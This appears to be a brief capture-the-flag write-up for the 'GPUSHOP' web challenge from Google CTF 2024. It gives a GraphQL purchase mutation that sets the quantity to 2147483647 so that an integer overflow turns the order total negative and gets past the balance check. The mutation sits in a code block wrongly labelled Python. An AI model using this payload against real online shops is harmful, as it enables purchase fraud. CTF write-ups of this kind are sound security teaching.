---
layout: page
title: "GPUSHOP - Google CTF 2024 Writeup"
subtitle: "GraphQL introspection reveals hidden admin mutations. Integer overflow in the price field allows purchasing a $999 GPU for $-1 (negative price billing)."
permalink: /ctf/writeups/challenges/web/gpushop/
category: "web"
challenge_name: "GPUSHOP"
difficulty: "Medium"
event: "Google CTF 2024"
points: "253"
solves: "62"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2024
* **Difficulty**: Medium
* **Points**: 253
* **Solves**: 62
* **Category**: Web
* **Tags**: GraphQL, Integer Overflow, Business Logic

---

## 📝 Description
GraphQL introspection reveals hidden admin mutations. Integer overflow in the price field allows purchasing a $999 GPU for $-1 (negative price billing).

---

## 💡 Solution / Approach
```python
mutation {
  purchaseItem(itemId: "GPU_4090", quantity: 2147483647) {
    receipt
    flag
  }
}
```

Integer overflow on `quantity * price` wraps to negative → balance check passes.
